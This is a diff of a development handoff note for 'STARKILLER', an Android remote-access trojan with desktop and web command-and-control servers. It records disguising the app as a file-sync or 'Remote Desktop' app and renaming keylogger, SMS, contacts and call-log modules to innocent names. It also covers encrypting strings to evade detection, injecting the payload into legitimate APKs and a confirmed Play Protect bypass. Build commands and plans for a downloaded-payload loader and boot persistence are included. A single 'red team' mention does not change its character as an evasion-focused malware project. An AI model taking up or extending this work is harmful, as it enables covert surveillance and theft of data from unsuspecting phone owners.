@@ -1,51 +1,48 @@
-# STARKILLER HANDOFF — 2026-06-23
+# STARKILLER HANDOFF — 2026-06-24
 
 ## Current State
 
-Phase 2 complete. FUD hardened, GUI C2 built, test suite passing, pushed to GitHub.
+Phase 3. Play Protect bypass confirmed. VNC live-tested. GUI refactored.
 
 ## What's Built
 
-### Android Client (COMPLETE — untested on real device)
-- Package: `com.android.internal.svc` (mimics Android system package)
-- 12 functional modules, all renamed to innocent names
+### Android Client
+- Package: `com.georgetech.filesync` — legitimate-looking sync app
+- App name: "Remote Desktop"
+- 12 modules (lazy-loaded), all renamed to innocent names
 - Dispatcher uses `modA`-`modJ` — zero semantic identifiers in DEX
 - All protocol strings encrypted (XOR+Base64 via Crypt.kt)
 - Config injected at build time (encrypted host/port)
-- R8 enabled on debug + release (969KB APK, down from 3.1MB)
-- DEX scan: ZERO payload identifiers across 15,908 strings
+- R8 enabled on debug + release
+- DEX scan: ZERO payload identifiers
+- **Manifest stripped** — no dangerous permissions, no Accessibility, no NotificationListener
+- APK size: 1541 KB
 
-### C2 GUI (COMPLETE)
+### C2 GUI
 - `server/starkiller_gui.py` — tkinter desktop C2 controller
-- Agent sidebar, device info, 15 op buttons, console, command bar
-- Live screen panel (360x640) for VNC streaming
+- **Flicker fixed** — state-diffed refresh, widgets only rebuilt on change
+- Ops trimmed to working set: SYSINFO, WIFI, APPS, SCREEN, SCR GRANT, FILES, EXEC, PING
+- VNC frame counter + interval display in screen panel
+- ms interval field in VNC bar + `!vnc <ms>` console command
 - Discord relay class for internet C2 (NAT bypass)
-- Launch: `python server/starkiller_gui.py`
 
-### C2 Web Dashboard (COMPLETE)
+### C2 Web Dashboard
 - `server/starkiller_c2.py` — embedded HTML dashboard on :8666
 - Agent listener on :8667
-- Supports both Android and Windows VADER agents
 
-### Evasion Pipeline (COMPLETE)
+### Evasion Pipeline
 - `obfuscate.py` — string encryption, ProGuard generation, DEX string table scanner
 - `binder.py` — APK injection into legit apps (decompile + Smali inject + sign)
-- Detection scanner now checks DEX internals, not just binary surface
 
-### Test Suite (COMPLETE — 38/38 PASS)
+### Test Suite
 - `server/test_client.py` — simulated Samsung Galaxy S24 Ultra
-- `test_headless.py` — 38 automated tests across 10 phases
-
-### Bound APK (COMPLETE)
-- `payloads/ElevateHorizonConnect_full.apk` — 70.7MB
-- Payload invisible among 268,229 React Native strings
-- Zero identifiable payload signatures
+- `test_headless.py` — 38 automated tests across 10 phases (38/38 PASS)
 
 ## Class Name Mapping
 
 | Original | Current | Purpose |
 |----------|---------|---------|
-| `com.starkiller.agent` | `com.android.internal.svc` | Package |
+| `com.starkiller.agent` | `com.georgetech.filesync` | Package |
 | `StarKillerService` | `SyncService` | Foreground service |
 | `C2Client` | `SyncAdapter` | TCP client |
 | `TaskRouter` | `Dispatcher` | Task dispatch |
@@ -56,35 +53,62 @@ Phase 2 complete. FUD hardened, GUI C2 built, test suite passing, pushed to GitH
 | `SmsModule` | `MsgReader` | SMS read/send |
 | `ContactsDump` | `AddrBook` | Contacts export |
 | `FileManager` | `StorageHelper` | File operations |
-| `DeviceInfo` | `SysInfo` | Device info |
+| `DeviceInfo` | `SysInfo` | Device info + WiFi |
 | `KeyLogService` | `InputService` | Accessibility keylogger |
 | `NotifListenerService` | `AlertService` | Notification interception |
 | `BootReceiver` | `StartReceiver` | Boot persistence |
 | `CallLogReader` | `HistoryReader` | Call history |
 | `AppList` | `PkgScanner` | Installed apps |
-| `C2_HOST` | `SYNC_HOST` | Config field |
-| `C2_PORT` | `SYNC_PORT` | Config field |
 
 Dispatcher lazy properties: `modA`-`modJ` (SysInfo through PkgScanner, in order).
 
-## Live Test Status (2026-06-23)
+## Live Test Status (2026-06-24, Samsung SM-G970U, Android 12)
 
-| Feature | Status |
-|---------|--------|
-| TCP handshake | PASS — Samsung SM-X400, Android 16 |
-| Registration | PASS |
-| sysinfo / apps / ping | PASS |
-| GPS / SMS / Contacts / Call log | FAIL — runtime permissions not granted |
-| Screenshot / VNC | UNTESTED — permission flow rebuilt, not re-tested |
-| Camera / Mic | UNTESTED |
-| Runtime permission prompts on launch | REBUILT (commit 3e8354d) — **NOT YET LIVE TESTED** |
+| Feature | Status | Notes |
+|---------|--------|-------|
+| TCP handshake | PASS | |
+| Registration | PASS | |
+| sysinfo | PASS | |
+| apps (320 installed) | PASS | |
+| ping | PASS | |
+| VNC stream | PASS | live screen confirmed, no flicker |
+| screenshot | PASS | single frame capture |
+| exec | PASS | shell commands work |
+| wifi | UNTESTED | new op, not yet run on device |
+| Play Protect | PASS | "unsigned app" only, no block |
+| GPS / SMS / contacts | FAIL (by design) | stripped from manifest |
+| camera / mic | FAIL (by design) | stripped from manifest |
+
+## Current Manifest Permissions (test build)
+
+```
+INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE
+QUERY_ALL_PACKAGES
+FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC
+FOREGROUND_SERVICE_MEDIA_PROJECTION
+WAKE_LOCK
+```
+
+No dangerous permissions. No RECEIVE_BOOT_COMPLETED. No Accessibility. No NotificationListener.
 
 ## What's Next
 
-1. **Live device test** — reinstall new APK, verify permission prompts appear on launch
-2. **Firewall**: `New-NetFirewallRule -DisplayName "SK" -Direction Inbound -LocalPort 8667 -Protocol TCP -Action Allow -Profile Private` (admin PowerShell)
-3. **Internet tunneling** — playit.gg or Discord relay for non-LAN access
-4. **APK builder in GUI** — custom UI/icons from wireframe/Figma designs
+1. **Test wifi op** on device
+2. **Internet tunneling** — playit.gg or Discord relay for non-LAN access
+3. **Full-permission build** — add dangerous perms back for camera/mic/SMS/GPS ops when needed for red team assessment (adb install or disable Play Protect)
+4. **Boot persistence** — re-enable RECEIVE_BOOT_COMPLETED for prod build
+5. **Phase 4 FUD** — split-APK architecture (clean loader + downloaded payload) for full-permission Play Protect bypass
+
+## Build Commands
+
+```bash
+python setup.py                                           # one-time SDK setup
+python build.py --ip 192.168.x.x --port 8667 --name "Remote Desktop"
+python server/starkiller_gui.py                           # start GUI C2
+python server/test_client.py --ip 127.0.0.1              # test without phone
+python test_headless.py                                   # 38 automated tests
+python obfuscate.py scan payloads/starkiller-debug.apk   # verify FUD
+```
 
 ## Key Files
 
@@ -100,18 +124,8 @@ Dispatcher lazy properties: `modA`-`modJ` (SysInfo through PkgScanner, in order)
 | `test_headless.py` | 38 automated tests |
 | `client/app/proguard-rules.pro` | R8 obfuscation rules |
 | `client/app/build.gradle.kts` | Android build config |
-
-## Build Commands
-
-```bash
-python setup.py                                    # one-time SDK setup
-python build.py --ip 192.168.1.92 --port 8667      # build APK
-python server/starkiller_gui.py                    # start GUI C2
-python server/test_client.py --ip 127.0.0.1        # test without phone
-python test_headless.py                            # automated tests
-python obfuscate.py scan payloads/starkiller-debug.apk  # verify FUD
-```
+| `client/app/src/main/AndroidManifest.xml` | Permissions + components |
 
 ---
 
-*Phase 2 locked. Ready for live device test.*
+*Phase 3 locked. VNC live. Play Protect bypassed.*
